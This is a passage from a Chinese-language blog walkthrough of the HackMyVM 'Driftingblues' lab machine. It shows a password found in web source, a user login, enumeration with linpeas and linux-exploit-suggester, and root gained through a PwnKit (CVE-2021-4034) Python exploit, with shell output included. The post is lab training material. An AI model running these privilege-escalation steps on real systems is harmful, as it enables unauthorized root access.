class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;drippin.jpg&#x27;</span>);</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-family</span>: Segoe;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;segoeui.ttf&#x27;</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.mainfo</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-family</span>: <span class="string">&#x27;Segoe&#x27;</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#ffffff</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-top</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.emoji</span> &#123;</span></span><br><span class="line"><span class="language-css">	<span class="attribute">width</span>: <span class="number">32px</span>;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">password is:</span><br><span class="line">imdrippinbiatch</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">driftingblues is hacked again so it&#x27;s now called drippingblues. :D hahaha</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">by</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">travisscott &amp; thugger</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>得到密码<code>imdrippinbiatch</code> 尝试了几个用户名，最后登录到thugger这个用户了</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">thugger@drippingblues:~$ ls -al</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x<span class="number"> 14 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.</span><br><span class="line">drwxr-xr-x <span class="number"> 3 </span>root    root   <span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>..</span><br><span class="line">-rw------- <span class="number"> 1 </span>thugger thugger   <span class="number"> 8 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.bash_history</span><br><span class="line">drwxr-xr-x<span class="number"> 10 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.cache</span><br><span class="line">drwxr-xr-x<span class="number"> 11 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.config</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Desktop</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Documents</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Downloads</span><br><span class="line">drwxr-xr-x <span class="number"> 3 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.local</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Music</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Pictures</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Public</span><br><span class="line">drwx------ <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Templates</span><br><span class="line">-r-x------ <span class="number"> 1 </span>thugger thugger  <span class="number"> 32 </span>Sep<span class="number"> 19 </span><span class="number"> 2021 </span>user.txt</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>thugger thugger<span class="number"> 4096 </span>Sep<span class="number"> 18 </span><span class="number"> 2021 </span>Videos</span><br></pre></td></tr></table></figure></div>
+<p>这个用户的目录下面除了user.txt是有用的其他都是空文件夹。 也没有sudo命令<br>用linpeas.sh扫描了一下发现</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root             31K Aug<span class="number"> 16 </span><span class="number"> 2019 </span>/usr/bin/pkexec  ---&gt;  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root            146K Jan<span class="number"> 19 </span><span class="number"> 2021 </span>/snap/core18/2128/usr/bin/sudo</span><br></pre></td></tr></table></figure></div>
+<p>这两个可疑的东西 但是我尝试了上面的那个漏洞没有成功</p>
+<p>上传linux-exploit-suggester.sh扫描可疑的漏洞 发现有pwnkit</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COQ"><figure class="iseeu highlight /coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] [CVE<span class="number">-2021</span><span class="number">-4034</span>] PwnKit</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/<span class="number">2022</span>/<span class="number">01</span>/<span class="number">25</span>/cve<span class="number">-2021</span><span class="number">-4034</span>/pwnkit.txt</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=<span class="number">10</span>|<span class="type">11</span>|<span class="type">12</span>|<span class="type">13</span>|<span class="type">14</span>|<span class="type">15</span>|<span class="type">16</span>|<span class="type">17</span>|<span class="type">18</span>|<span class="type">19</span>|<span class="type">20</span>|<span class="type">21</span> ],debian=<span class="number">7</span>|<span class="type">8</span>|<span class="type">9</span>|<span class="type">10</span>|<span class="type">11</span>,fedora,manjaro</span><br><span class="line">   Download URL: https://codeload.github.com/berdav/CVE<span class="number">-2021</span><span class="number">-4034</span>/zip/main</span><br></pre></td></tr></table></figure></div>
+
+<p>在github找到py脚本可以直接使用，靶机上有python3</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">thugger@drippingblues:~$ vi pwn.py</span><br><span class="line">thugger@drippingblues:~$ python3 pwn.py</span><br><span class="line">[+] Creating shared library <span class="keyword">for</span> exploit code.</span><br><span class="line">[-] <span class="attribute">GCONV_PATH</span>=. directory already exists, continuing.</span><br><span class="line">[+] Calling execve()</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=1001(thugger) <span class="attribute">groups</span>=1001(thugger)</span><br></pre></td></tr></table></figure></div>
+<p>这里其他也有很多漏洞可以提权 刚刚随便试了一个CVE-2021-3156也是可以的，github也有对应的py文件</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>前面出现的信息需要甄别，这题里面有没有的信息比如secret.zip 虚假的ssh密码获取方式 但是robots.txt中的内容我没有很好的完全利用上</li>
+<li>新下载了linux-exploit-suggester.sh这个工具用来查找漏洞</li>
+<li>漏洞最好用py的，可以在靶机上直接运行</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/50762.html" title="HMV-Driftingblues">https://guayu-kakeru.github.io/posts/50762.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/6117.html" rel="prev" title="HMV-family3">
+      <i class="fa fa-chevron-left"></i> HMV-family3
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">端口扫描 &#x2F; 信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50762.html" title="posts&#x2F;50762.html">HMV-Driftingblues</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/6117.html" title="posts&#x2F;6117.html">HMV-family3</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/21833.html" title="posts&#x2F;21833.html">SQL漏洞学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/23894.html" title="posts&#x2F;23894.html">HMV-SuidyRevenge</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/40609.html" title="posts&#x2F;40609.html">CSRF漏洞学习笔记</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
